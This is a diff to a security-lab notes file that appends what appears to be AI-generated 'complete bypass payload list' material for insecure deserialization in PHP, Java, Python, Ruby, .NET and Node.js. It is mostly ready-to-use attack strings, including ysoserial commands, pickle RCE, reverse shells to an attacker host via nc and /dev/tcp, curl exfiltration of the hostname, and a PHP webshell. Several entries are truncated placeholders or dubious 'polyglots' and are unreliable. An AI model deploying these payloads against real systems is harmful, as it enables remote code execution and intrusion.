@@ -836,3 +836,347 @@ I change the session object in the 2 requests generated when deleting the acount
 
 ![img](images/13%20-%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/10.png)
 
+Below is the **Insecure Deserialization – Complete Bypass Payload List**, written in the **same format** as all your previous ones (SSTI / Command Injection / Directory Traversal / XXE / SSRF / Host Header / CORS / HTTP Smuggling).
+
+This includes **Java, PHP, Python, .NET, Node.js, Ruby**, along with **gadget chains, polyglots, filter bypass, encoding bypass, tampering payloads, real-world RCE examples**, and **advanced exploit chains**.
+
+---
+
+# ⭐ **Insecure Deserialization – Complete Bypass Payload List**
+
+---
+
+# **1. Core Concepts (Simple Payloads)**
+
+### **Tampering Serialized Data**
+
+```
+O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}
+```
+
+### **Modify object values**
+
+```
+{"role":"admin","uid":1}
+```
+
+### **Replace class/object name**
+
+```
+O:8:"EvilClass":0:{}
+```
+
+---
+
+# **2. PHP Serialization Payloads**
+
+### **Basic PHP Serialized Tampering**
+
+```
+a:2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}
+```
+
+### **Object Injection (PHP)**
+
+```
+O:8:"UserData":2:{s:4:"file";s:12:"/etc/passwd";s:6:"action";s:4:"read";}
+```
+
+### **PHP Universal RCE Gadget (Monolog)**
+
+```
+O:24:"Monolog\Handler\SyslogUdpHandler":2:{...}
+```
+
+---
+
+# **3. Java Deserialization Payloads**
+
+### **Java Serialized Exploit Skeleton**
+
+```
+ac ed 00 05 ... (binary)
+```
+
+### **Java Commons-Collections RCE**
+
+Generated via ysoserial:
+
+```
+java -jar ysoserial.jar CommonsCollections6 "nc attacker 4444 -e /bin/sh"
+```
+
+### **BeanShell RCE Gadget**
+
+```
+BeanShellPayload.class
+```
+
+---
+
+# **4. Python Pickle RCE Payloads**
+
+### **Simple Python Pickle RCE**
+
+```python
+import os
+class RCE(object):
+    def __reduce__(self):
+        return (os.system, ('id',))
+```
+
+Serialized output becomes:
+
+```
+cos\nsystem\n(S'id'\ntR.
+```
+
+### **Pickle Reverse Shell**
+
+```
+(os.system, ("bash -i >& /dev/tcp/attacker/4444 0>&1",))
+```
+
+---
+
+# **5. Ruby Marshal Payloads**
+
+### **Ruby RCE Gadget**
+
+```
+puts Marshal.dump(Object.new)
+```
+
+### **Ruby Deserialization RCE (YAML Load)**
+
+```
+--- !ruby/object:Gem::Installer
+i: x
+gem_home: "`id`"
+```
+
+---
+
+# **6. .NET BinaryFormatter Payloads**
+
+### **.NET RCE Payload**
+
+Use:
+
+```
+ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"
+```
+
+Result:
+
+```
+AAEAAAD/////AQAAAAAAAAAEAQAAA...
+```
+
+---
+
+# **7. Node.js Serialization Payloads**
+
+### **Node.js RCE via `vm2` / `serialize-javascript`**
+
+```
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+```
+
+---
+
+# **8. JSON Deserialization Exploits**
+
+### **Prototype Pollution**
+
+```
+{
+  "__proto__": { "admin": true }
+}
+```
+
+### **Unsafe JSON-to-Object Conversions**
+
+```
+{"constructor":{"prototype":{"exec":"id"}}}
+```
+
+---
+
+# **9. Bypass Filters via Encoding**
+
+### **Base64-Encoding Serialized Payload**
+
+```
+TzoxMDoiRW1wdHlPYmplY3QiOjA6e30=
+```
+
+### **URL-Encoding Serialized Data**
+
+```
+O%3A8%3A%22UserData%22%3A2%3A...
+```
+
+### **Hex Encoding**
+
+```
+4f 3a 38 3a 55 73 65 72 ...
+```
+
+---
+
+# **10. Null Byte Injection (Legacy PHP)**
+
+```
+O:8:"UserData":2:{...}%00.png
+```
+
+---
+
+# **11. Compression Wrapper Bypass**
+
+### **Gzip Compressed Payload**
+
+```
+H4sIAAAAAAAACv3BMQEAAADCoPVPbQwfoAAAAAAAAAAAAA==
+```
+
+### **Brotli Deserialization Bypass**
+
+```
+/* compressed object */
+```
+
+---
+
+# **12. Chained Gadget Payloads**
+
+### **Java CC Gadget + File Write**
+
+```
+ysoserial CommonsCollections5 "echo hacked > /tmp/pwned"
+```
+
+### **PHP Phar + Object Injection**
+
+```
+phar://evil.jpg/test
+```
+
+---
+
+# **13. Polymorphic Deserialization (JSON → XML → Java)**
+
+Embed malicious serialized Java object in JSON:
+
+```
+{
+  "user": "rO0ABXNyABF..."
+}
+```
+
+---
+
+# **14. Polyglot Deserialization Payloads**
+
+(Works on multiple engines)
+
+```
+O:8:"stdClass":0:{}{{7*7}}cos\nsystem\n(S'id'\ntR.
+```
+
+---
+
+# **15. RCE via Magic Methods (PHP)**
+
+### **Using `__wakeup()`**
+
+```
+O:6:"Logger":1:{s:4:"cmd";s:2:"id";}
+```
+
+### **Using `__destruct()`**
+
+```
+O:8:"Database":1:{s:3:"dns";s:12:"`id > /tmp/x`";}
+```
+
+---
+
+# **16. XXE Inside Serialized Payload**
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+```
+
+Used where deserialization triggers XML loading.
+
+---
+
+# **17. Deserialization Via File Upload (Phar Tricks)**
+
+PHP:
+
+```
+phar://uploaded.jpg/test
+```
+
+Used to trigger `unserialize()` inside metadata.
+
+---
+
+# **18. Advanced Bypass Payloads**
+
+### **Insecure Deserialization → Command Execution**
+
+```
+O:8:"Template":1:{s:4:"exec";s:10:"/bin/bash";}
+```
+
+### **Logic Modification**
+
+```
+O:4:"User":2:{s:5:"admin";b:1;s:2:"id";i:1;}
+```
+
+### **Authentication Bypass**
+
+```
+{"isAdmin": true}
+```
+
+---
+
+# **19. Blind Deserialization Payloads**
+
+### **Time-based**
+
+```
+(os.system, ("sleep 5",))
+```
+
+### **DNS-based**
+
+```
+(os.system, ("curl attacker.com/`hostname`",))
+```
+
+---
+
+# **20. Real-World RCE Payloads**
+
+### **Java Reverse Shell**
+
+```
+ysoserial CommonsCollections6 "bash -i >& /dev/tcp/attacker/4444 0>&1"
+```
+
+### **PHP Phar → Webshell Write**
+
+```
+"<?php system($_GET['cmd']); ?>"
+```
+
+Embedded inside a Phar stub.
+
+---
